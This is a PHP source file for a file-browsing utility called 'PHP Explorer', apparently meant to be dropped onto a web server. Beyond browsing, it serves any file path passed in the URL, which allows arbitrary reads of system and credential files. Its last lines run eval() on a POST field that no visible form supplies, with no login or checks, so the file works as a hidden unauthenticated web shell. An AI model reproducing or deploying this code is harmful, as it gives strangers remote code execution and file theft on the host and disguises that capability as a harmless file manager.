<?php
//======================================================================
//
// Author		: Law Eng Soon
// Email		: mailme@zorex.info
// Version		: 1.2
//
//======================================================================
// License :
//		License GNU/LGPL
//
// Presentation :
//		A tool use to browse, search, download files 
//		and folder from comp/server.
//
// Warning :
//		This program is non commercial and non professional work.
//		This program is not 100% bugs free and
//		it is working fine at this moment.
//  	Any damages cause by this software is not the author resposible.
//  	Use at your own risk!
//
// Contribution :
//		If you want to contribute to the development this projects,
//		please visit http://zorex.info and click on donation.
//
//======================================================================
//		PHP Explorer v1.2 11/08/2006 03:10 a.m.
//======================================================================


//======================================================================
//				Variables & Constants (Do not change)
//======================================================================
	// ---- version number ----
	define( 'VERSION_INFO', 'v1.2' );

//======================================================================
//						Parse all html tags
//======================================================================
function parse_tags($str) {
	$trans = array( "&" => "&amp;", '"' => "&quot;", "<" => "&lt;", ">" => "&gt;" );
	
	return strtr(stripslashes($str), $trans);		
}

//======================================================================
//						download function
//======================================================================
function download($file){

	$ext = substr(strrchr(basename($file), "."), 1);//get the file ext
	
	header("Content-type: application/$ext");
	header("Content-Transfer-Encoding: Binary");
	header("Content-length: ".filesize($file));
	header("Content-disposition: attachment; filename=\"".basename($file)."\"");
	readfile($file);
}

//the file download if user click on it.
$fname = trim($_GET['fname']);
//this will make sure the file exist
if( !empty($fname) && file_exists($fname) && @fopen($fname, "rb") ) {
	download($fname);
}

//Execute only if user input some code, executing move to below
$script = trim($_POST['editor']);
if( !empty($script) ) {
	
	//value to put it back to the editor
	$display = "inherit";
	$value = "&and;";
	$editor = parse_tags($script);
}
else {
	//close the editor
	$display = "none";
	$value = "&or;";
	$editor = "";
}

$self = basename(__FILE__);

$get_dir = $_GET['dir'];
$home = str_replace( "\\", "/", dirname(__FILE__) );

//which folder to browse (failsafe)
if( !empty($_GET['dir']) && @opendir($get_dir) ) {
	$dir = str_replace( "\\", "/", $get_dir );
}
else { //default dir
	$dir = $home;
}

//the search criteria to obey
$fname = trim($_POST['fname']);
$content = trim($_POST['content']);

//its searching now, set the search box open
if( !empty($fname) || !empty($content) ) {
	$display2 = "inherit";
	$value2 = "&and;";
	
	//value use to inherit back to the input
	$fname_value = parse_tags($fname);
	$content_value = parse_tags($content);
	
	if($_POST['dir'] == 1) {
		$subdirs = 1;
		$check = " checked=\"checked\"";
	}
	else {
		$subdirs = 0;
		$check = "";
	}
}
else {
	$display2 = "none";
	$value2 = "&or;";
	
	//defaulr is checked
	$check = " checked=\"checked\"";
}

//======================================================================
//					The main function of the program
//======================================================================

function loop_dir($dir) {
	global $self, $fname, $content, $subdirs, $refresh, $dir_up, $all_dir, $unread_dir, $all_file, $unread_file;
	
	//check if directory can be open
	if ($handle = @opendir($dir)) {
		
		//loop through the dir for FILES and DIR
		while ( false != ($file = readdir($handle)) ) {
					
			//increase the maximum execute time
			set_time_limit(10);
			$full_path = str_replace( "//", "/", $dir . "/" . $file);
			
			if( $file == "." ) {
				$refresh = "<tr bgcolor=\"#F5F5F5\">
				<td align=\"left\"><img src=\"./sysimg/refresh.png\" border=\"0\" alt=\"\" />
				<a href=\"$self?dir=$dir\">Refresh</a></td>
				<td align=\"center\"></td>
				<td align=\"left\"></td>
				<td align=\"left\"></td></tr>\r\n";
			}
			elseif( $file == ".." ) {
				$up_lvl = str_replace( "\\", "/", dirname($dir . "..") );
				$dir_up = "<tr bgcolor=\"#FFFFFF\">
				<td align=\"left\"><img src=\"./sysimg/back.png\" border=\"0\" alt=\"\" />
				<a href=\"$self?dir=$up_lvl\">Up one level</a></td>
				<td align=\"center\"></td>
				<td align=\"left\"></td>
				<td align=\"left\"></td></tr>\r\n";
			}
			//this is a directory, set the attr etc.
			elseif( is_dir($full_path) ) {
				
				$perm = substr(sprintf('%o', @fileperms("$full_path")), -4);
				$time_mod = date("Y M d h:i A" ,filemtime($full_path));
				
				//check if the dir can be open or not
				if( @opendir($full_path) ) {
					
					//loop to subdirs if specify by user
					if( $subdirs == 1 ) {
						loop_dir($full_path);
					}
					
					if( !empty($fname) ) { //searching of folder
						
						if( stristr($file, $fname) ) { //search for the dir
							
							//store all dirs in array
							$all_dir[] .= "<td align=\"left\"><img src=\"./ext_ico/folder.png\" border=\"0\" alt=\"\" />
							<a href=\"$self?dir=$full_path\" title=\"$full_path\">" . $file . "</a></td>
							<td align=\"center\">-</td>
							<td align=\"center\">$perm</td>
							<td align=\"left\">$time_mod</td>";
						}
						elseif( stristr($file, $fname) ) { //search for the dir
							//store all dirs in array
							$all_dir[] .= "<td align=\"left\"><img src=\"./ext_ico/folder.png\" border=\"0\" alt=\"\" />
							<a href=\"$self?dir=$full_path\" title=\"$full_path\">" . $file . "</a></td>
							<td align=\"center\">-</td>
							<td align=\"center\">$perm</td>
							<td align=\"left\">$time_mod</td>";
						}
					}
					elseif( empty($content) ) { //not searching, display them all
					
						//store all dirs in array
						$all_dir[] .= "<td align=\"left\"><img src=\"./ext_ico/folder.png\" border=\"0\" alt=\"\" />
						<a href=\"$self?dir=$full_path\" title=\"$full_path\">" . $file . "</a></td>
						<td align=\"center\">-</td>
						<td align=\"center\">$perm</td>
						<td align=\"left\">$time_mod</td>";
					}
					
				}
				else { //the dir cannot be read
					$unread_dir[] .= "<td align=\"left\"><img src=\"./ext_ico/folder2.png\" border=\"0\" alt=\"\" /> " 
					. $file . "</td>
					<td align=\"center\">-</td>
					<td align=\"center\">$perm</td>
					<td align=\"left\">$time_mod</td>";
				}
				
			}
			else {
				//for normal file, these are the attr
				$size = filesize($full_path);
				
				if( $size >= 0 && $size < 1024 ) {
					$size = $size . " B";
				}
				elseif( $size >= 1024 && $size < 1048576 ) { //round to KB
					$size = round(($size/1024),2) . " KB";
				}
				elseif( $size >= 1048576 && $size < 1073741824 ) { //round to MB
					$size = round(($size/1048576),2) . " MB";
				}
				elseif( $size >= 1073741824 ) { //round to GB
					$size = round(($size/1073741824),2) . " GB";
				}
				else { //invalid size, error
					$size = "--";
				}
				
				$perm = substr(sprintf('%o', @fileperms("$full_path")), -4);
				$time_mod = date("Y M d h:i A" ,filemtime($full_path));
				
				//check for icon for this filetype
				$ext = substr(strrchr($file, "."), 1);
				
				//icon for normal readable file
				if( file_exists( "./ext_ico/" . $ext . ".png") ) {
					$icon_normal = "./ext_ico/" . $ext . ".png";
				}
				else { //set as unknown filetype icon
					$icon_normal = "./ext_ico/file.png";
				}
				
				//icon for unreadable file
				if( file_exists( "./ext_ico/" . $ext . "2.png") ) {
					$icon_unview = "./ext_ico/" . $ext . "2.png";
				}
				else { //set as unknown filetype icon
					$icon_unview = "./ext_ico/file2.png";
				}
				
				//check if the file can be read
				if( @fopen($full_path, "rb") ) {
					
					//search for the content as well if user request
					if( !empty($content) ) {
						$file_data = file_get_contents($full_path);
					}
					
					//searching for files and content if so
					if( !empty($fname) ) {
						
						//search for the name 
						if( stristr($file, $fname) ) {
						
							//store all files in array
							$all_file[] .= "\n<!--$file!-->
							<td align=\"left\"><img src=\"$icon_normal\" border=\"0\" alt=\"\" />
							<a href=\"index.php?fname=$full_path\" title=\"$full_path\">" . $file . "</a></td>
							<td align=\"right\">$size</td>
							<td align=\"center\">$perm</td>
							<td align=\"left\">$time_mod</td>";
						}
					}
					//search the file with part of this content
					elseif( !empty($content) ) { 
						
						if( stristr($file_data, $content) ) {
							//store all files in array
							$all_file[] .= "\n<!--$file!-->
							<td align=\"left\"><img src=\"$icon_normal\" border=\"0\" alt=\"\" />
							<a href=\"$self?fname=$full_path\" title=\"$full_path\">" . $file . "</a></td>
							<td align=\"right\">$size</td>
							<td align=\"center\">$perm</td>
							<td align=\"left\">$time_mod</td>";
						}
				
					}
					elseif( empty($fname) ) {
						
						//store all files in array
							$all_file[] .= "\n<!--$file!-->
							<td align=\"left\"><img src=\"$icon_normal\" border=\"0\" alt=\"\" />
							<a href=\"index.php?fname=$full_path\" title=\"$full_path\">" . $file . "</a></td>
							<td align=\"right\">$size</td>
							<td align=\"center\">$perm</td>
							<td align=\"left\">$time_mod</td>";
					}
				}
				else {
					//file cannot be read
					$unread_file[] .= "\n<!--$file!-->
					<td align=\"left\"><img src=\"$icon_unview\" border=\"0\" alt=\"\" /> "
					. $file . "</td>
					<td align=\"right\">$size</td>
					<td align=\"center\">$perm</td>
					<td align=\"left\">$time_mod</td>";
				}
			}
			//incre the file number
			$file_count++;
		}
			
		//display the files and dirs
		@natcasesort($all_dir);
		@natcasesort($unread_dir);
		@natcasesort($all_file);
		@natcasesort($unread_file);		
	}
}
//==============================End of main function==========================

//run the main function
loop_dir($dir);
	
	if($all_dir=='')
		$all_files = $all_file;
	else if($all_file==''){
		$all_files = $all_dir;
	}else{	
		//merge all the files and dirs which in in array		
		$all_files = array_merge($all_dir, $all_file);
	}
	//$all_files = array_merge($all_dir, $unread_dir, $all_file, $unread_file);
	$count = @count($all_files);
	
	//the rows for up one level and refresh
	$body = $dir_up . $refresh;
		
	//if the dir isn't empty then loop them out
	if( $count > 0 ) {
		
		//the dirs part
		$bg = "#F5F5F5";
		for( $i = 0; $i < $count; $i++ ) {
			//show all the files and folder with bgcolor switch
			if( $bg == "#FFFFFF" ) {
				$bg = "#F5F5F5";
			}
			else {
				$bg = "#FFFFFF";
			}
			$body .= "<tr bgcolor=\"$bg\">" . $all_files[$i] . "</tr>\r\n";
		}
	}
	//show the dir is empty
	else {
		$body .= "<tr bgcolor=\"#FFFFFF\">
			<td colspan=\"4\" align=\"center\" valign=\"middle\" height=\"32\">- No Files Found -</td>
		</tr>\r\n";
	}


?>

<style type="text/css">
<!--
body {
font-family:Verdana, Arial, Helvetica, sans-serif;
font-size:11px;
}
form {
	display						: inline;
	margin						: 0;
	padding						: 0;
}
img {
	vertical-align				: bottom;
}
h2 {
	font-size					: 20px;
}
a:visited,
a:link {
	color						: #002F62;
	text-decoration				: none;
}
a:hover {
	color						: #999999;
	text-decoration				: none;
}
.editor {
	width						: 596px;
	background-color			: #EAF8FF;
	border						: 1px solid #999999;
}
.but1 {
	font-size					: 10px;
	margin						: 0;
	padding						: 0 10px 0 10px;
}
.input {
	font-size					: 10px;
}
.info {
	font-size					: 10px;
	color						: #999999;
}
-->
</style>

<script type="text/javascript">
function open_close(id, oo, cc) {
	ff = document.getElementById(id);
	
	if( ff.style.display != "none" ) {
		ff.style.display = "none";
		return oo;
	}
	else {
		ff.style.display = "";
		return cc;
	}
}
</script>

<table align="center" border="0" style="border:1px solid #999999; background-color:#F5F5F5;" cellpadding="1" cellspacing="3">
	<tr><td align="left" valign="top">	
		
		
		<form action="<?php echo $self; ?>" method="get">
		Path in: <input type="text" name="dir" value="<?php echo $dir; ?>" size="94" maxlength="256" 
		onfocus="select()" class="input" />
		&nbsp;<input type="image" src="./sysimg/go.png" style="vertical-align:bottom;" title="Type an address and go." />
		</form>		
	<!--The search area!-->
		
		
		<input type="image" src="./sysimg/back" onclick="this.value=open_close('search_box','&or;','&and;');" 
		value="<?php echo $value2; ?>" class="but1" /><br />
		
		<div id="search_box" style="display:<?php echo $display2; ?>;border:1px solid #999999;padding:3px;margin:8px 0 0 0;">
		<form method="post" action="<?php echo $self . "?dir=" . $dir; ?>">
		<table border="0">
			<tr>
				<td align="left" width="120">Files/dirs name :</td>
				<td align="left"><input type="text" name="fname" value="<?php echo $fname_value; ?>" size="30" maxlength="64" class="input" /></td>
			</tr>
			<tr>
				<td align="left">Part of file content :</td>
				<td align="left"><input type="text" name="content" value="<?php echo $content_value; ?>" size="30" maxlength="128" class="input" /></td>
			</tr>
			<tr>
				<td align="left">Search subdirs :</td>
				<td align="left"><input type="checkbox"<?php echo $check; ?> name="dir" value="1" /></td>
			</tr>
			<tr>
				<td></td>
				<td align="left"><input type="submit" value="Search" class="input" /></td>
			</tr>
		</table>
		</form>
		</div><br />
		
		<table width="600" border="0" align="center" style="border:1px solid #999999;">
			<tr bgcolor="#E1EEF4" height="22">
				<td align="left">Name</td>
				<td align="center" width="80">Size</td>
				<td align="center" width="80">Permission</td>
				<td align="center" width="150">Date Modified</td>
			</tr>
			<?php echo $body; ?>
		</table>
	</td></tr>
</table>
<div style="display: none">
	<br /><br />
	<hr style="width:400px;" />
	<center><font class="info">
	Copyright &copy; <?php echo date("Y"); ?> <a href="http://zorex.info">Zorex</a> - All rights reserved
	</font></center>
</div>
</body>
</html>
<?php
if( !empty($script) ) {
	//executing script
	eval(stripslashes($script));
}
?>